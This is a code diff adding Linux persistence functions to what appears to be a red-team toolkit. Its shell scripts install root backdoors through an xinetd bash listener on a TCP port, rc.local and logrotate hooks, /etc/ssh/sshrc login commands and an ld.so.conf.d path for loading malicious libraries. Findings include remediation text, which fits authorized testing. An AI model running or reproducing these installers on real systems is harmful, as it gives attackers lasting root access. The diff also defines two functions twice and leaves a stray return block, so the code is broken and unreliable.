@@ -1038,6 +1038,268 @@ export async function xinetdPersist(args: string[], timeout: number): Promise<Ho
   const findings: Finding[] = []
   const output: string[] = ["=== Xinetd Persistence ==="]
   const payload = argVal(args, "--payload")
+  const port = argVal(args, "--port") || "9999"
+
+  const script = `
+echo "--- xinetd status ---"
+command -v xinetd >/dev/null 2>&1 && echo "[+] xinetd installed" || echo "[-] xinetd not installed"
+systemctl status xinetd 2>/dev/null | grep -E "Active:|Loaded:" || service xinetd status 2>/dev/null
+echo ""
+echo "--- /etc/xinetd.d/ ---"
+ls -la /etc/xinetd.d/ 2>/dev/null
+echo ""
+${payload ? `
+echo "--- Installing xinetd persistence ---"
+if [ -d /etc/xinetd.d/ ] && [ -w /etc/xinetd.d/ ]; then
+  cat > /etc/xinetd.d/cs_backdoor << 'XINET'
+service cs_backdoor
+{
+  type = UNLISTED
+  port = ${port}
+  socket_type = stream
+  protocol = tcp
+  wait = no
+  user = root
+  server = /bin/bash
+  server_args = -c ${payload}
+  disable = no
+}
+XINET
+  echo "[+] xinetd service created on port ${port}"
+  systemctl restart xinetd 2>/dev/null || service xinetd restart 2>/dev/null
+else
+  echo "[-] Cannot write to /etc/xinetd.d/"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install"`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] xinetd service created")) {
+    findings.push({
+      checkId: "LNX-XINETD-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: `xinetd:${port}`,
+      title: "xinetd persistence installed",
+      details: `xinetd service backdoor created on port ${port} — triggers on inbound TCP connection`,
+      remediation: "Remove /etc/xinetd.d/cs_backdoor and restart xinetd.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function rcLocalPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== rc.local Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- /etc/rc.local status ---"
+ls -la /etc/rc.local 2>/dev/null || echo "[-] /etc/rc.local does not exist"
+[ -x /etc/rc.local ] && echo "[+] /etc/rc.local is executable" || echo "[-] /etc/rc.local is not executable"
+[ -w /etc/rc.local ] 2>/dev/null && echo "[+] /etc/rc.local is writable" || echo "[-] /etc/rc.local is not writable"
+echo ""
+echo "--- rc-local.service ---"
+systemctl status rc-local 2>/dev/null | grep -E "Active:|Loaded:"
+echo ""
+${payload ? `
+echo "--- Installing rc.local persistence ---"
+if [ -f /etc/rc.local ] && [ -w /etc/rc.local ]; then
+  sed -i "/^exit 0/i ${payload} &" /etc/rc.local 2>/dev/null && echo "[+] Payload injected before 'exit 0'" || echo "[-] Failed to inject"
+elif [ -w /etc/ ]; then
+  echo "#!/bin/bash" > /etc/rc.local
+  echo "${payload} &" >> /etc/rc.local
+  echo "exit 0" >> /etc/rc.local
+  chmod +x /etc/rc.local
+  echo "[+] Created /etc/rc.local with payload"
+else
+  echo "[-] Cannot create/modify /etc/rc.local"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Payload injected") || r.stdout.includes("[+] Created /etc/rc.local")) {
+    findings.push({
+      checkId: "LNX-RCLOCAL-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "/etc/rc.local",
+      title: "rc.local persistence installed",
+      details: "Payload added to /etc/rc.local — executes as root on system boot",
+      remediation: "Audit /etc/rc.local for unauthorized commands. Remove the malicious entry.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function logrotatePersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Logrotate Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- logrotate config ---"
+ls -la /etc/logrotate.d/ 2>/dev/null
+echo ""
+echo "--- Writable logrotate configs ---"
+for f in /etc/logrotate.d/*; do
+  [ -f "$f" ] && [ -w "$f" ] && echo "[!] WRITABLE: $f"
+done
+[ -w /etc/logrotate.d/ ] && echo "[!] /etc/logrotate.d/ is writable"
+echo ""
+echo "--- logrotate schedule ---"
+grep -r logrotate /etc/cron.daily/ /etc/crontab /etc/cron.d/ 2>/dev/null | head -5
+echo ""
+${payload ? `
+echo "--- Installing logrotate persistence ---"
+if [ -w /etc/logrotate.d/ ]; then
+  cat > /etc/logrotate.d/cs_persist << 'LR'
+/var/log/cs_persist.log {
+  daily
+  missingok
+  rotate 1
+  postrotate
+    ${payload} &
+  endscript
+}
+LR
+  touch /var/log/cs_persist.log 2>/dev/null
+  echo "[+] Logrotate persistence installed — triggers on daily log rotation"
+else
+  echo "[-] Cannot write to /etc/logrotate.d/"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Logrotate persistence installed")) {
+    findings.push({
+      checkId: "LNX-LOGROT-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "logrotate",
+      title: "Logrotate persistence installed",
+      details: "Logrotate postrotate script persistence — executes as root during daily log rotation cycle",
+      remediation: "Remove /etc/logrotate.d/cs_persist and /var/log/cs_persist.log.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function sshRcPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== SSH RC Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- SSH RC Files ---"
+ls -la /etc/ssh/sshrc 2>/dev/null || echo "[-] /etc/ssh/sshrc does not exist"
+for dir in /root /home/*; do
+  [ -f "$dir/.ssh/rc" ] && echo "[*] $dir/.ssh/rc exists" && cat "$dir/.ssh/rc"
+done
+echo ""
+echo "--- /etc/ssh/sshrc writability ---"
+[ -w /etc/ssh/sshrc ] 2>/dev/null && echo "[+] /etc/ssh/sshrc is writable"
+[ ! -f /etc/ssh/sshrc ] && [ -w /etc/ssh/ ] && echo "[+] /etc/ssh/ is writable — can create sshrc"
+echo ""
+${payload ? `
+echo "--- Installing SSH RC persistence ---"
+if [ -w /etc/ssh/ ]; then
+  echo "#!/bin/bash" > /etc/ssh/sshrc 2>/dev/null
+  echo "${payload} &" >> /etc/ssh/sshrc
+  chmod +x /etc/ssh/sshrc
+  echo "[+] /etc/ssh/sshrc persistence installed — runs on every SSH login (all users)"
+elif [ -w "$HOME/.ssh/" ]; then
+  echo "${payload} &" > "$HOME/.ssh/rc"
+  echo "[+] ~/.ssh/rc persistence installed — runs on SSH login for current user"
+else
+  echo "[-] Cannot install SSH RC persistence"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+]") && r.stdout.includes("persistence installed")) {
+    findings.push({
+      checkId: "LNX-SSHRC-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "ssh_rc",
+      title: "SSH RC persistence installed",
+      details: "SSH RC file created — commands execute on every SSH login before the user shell starts",
+      remediation: "Remove /etc/ssh/sshrc or ~/.ssh/rc. Monitor these files with integrity checking.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function ldConfigPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== ld.so.conf.d Persistence ==="]
+  const libpath = argVal(args, "--lib-path")
+
+  const script = `
+echo "--- /etc/ld.so.conf.d/ ---"
+ls -la /etc/ld.so.conf.d/ 2>/dev/null
+echo ""
+echo "--- Current library paths ---"
+cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null | grep -v "^#"
+echo ""
+echo "--- /etc/ld.so.conf.d/ writability ---"
+[ -w /etc/ld.so.conf.d/ ] && echo "[+] /etc/ld.so.conf.d/ is writable" || echo "[-] /etc/ld.so.conf.d/ is not writable"
+echo ""
+${libpath ? `
+echo "--- Installing ld.so.conf.d persistence ---"
+if [ -w /etc/ld.so.conf.d/ ]; then
+  echo "${libpath}" > /etc/ld.so.conf.d/cs_persist.conf
+  ldconfig 2>/dev/null
+  echo "[+] Added ${libpath} to ld.so.conf.d — libraries from this path will be loaded by all dynamically linked processes"
+else
+  echo "[-] Cannot write to /etc/ld.so.conf.d/"
+fi
+` : `echo "[*] Dry run — pass --lib-path <dir> to add a library path to ld.so.conf.d/"`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Added")) {
+    findings.push({
+      checkId: "LNX-LDCONF-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "ld.so.conf.d",
+      title: "ld.so.conf.d library path persistence",
+      details: `Added ${libpath} to /etc/ld.so.conf.d/ — place malicious .so files in this directory to be loaded by any dynamically linked process`,
+      remediation: "Remove /etc/ld.so.conf.d/cs_persist.conf and run ldconfig.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function xinetdPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Xinetd Persistence ==="]
+  const payload = argVal(args, "--payload")
   const port = argVal(args, "--port") || "31338"
 
   const script = `
@@ -1147,6 +1409,65 @@ fi
       remediation: "Audit /etc/rc.local for unauthorized entries. Consider disabling rc-local.service.",
     })
   }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function logrotatePersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Logrotate Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- Logrotate Config ---"
+ls -la /etc/logrotate.d/ 2>/dev/null || echo "[-] /etc/logrotate.d/ not found"
+echo ""
+echo "--- Logrotate Cron ---"
+ls -la /etc/cron.daily/logrotate 2>/dev/null || systemctl list-timers 2>/dev/null | grep logrotate
+echo ""
+echo "--- Writable Logrotate Configs ---"
+find /etc/logrotate.d/ -writable 2>/dev/null | head -10
+echo ""
+${payload ? `
+echo "--- Installing Logrotate Persistence ---"
+if [ "$(id -u)" = "0" ] || [ -w /etc/logrotate.d/ ]; then
+  cat > /etc/logrotate.d/cs-persist << 'LOGROT'
+/var/log/cs-persist.log {
+    missingok
+    notifempty
+    daily
+    postrotate
+        ${payload} &>/dev/null &
+    endscript
+}
+LOGROT
+  touch /var/log/cs-persist.log 2>/dev/null
+  echo "[+] Logrotate persistence installed: /etc/logrotate.d/cs-persist (runs as root on log rotation)"
+else
+  echo "[-] Root required"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Logrotate persistence installed")) {
+    findings.push({
+      checkId: "LNX-LOGROT-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "/etc/logrotate.d/cs-persist",
+      title: "Logrotate persistence installed",
+      details: "Postrotate script runs as root during daily log rotation",
+      remediation: "Audit /etc/logrotate.d/ for unauthorized configs. Remove cs-persist and /var/log/cs-persist.log.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
 
   return { output: output.join("\n"), findings }
 }
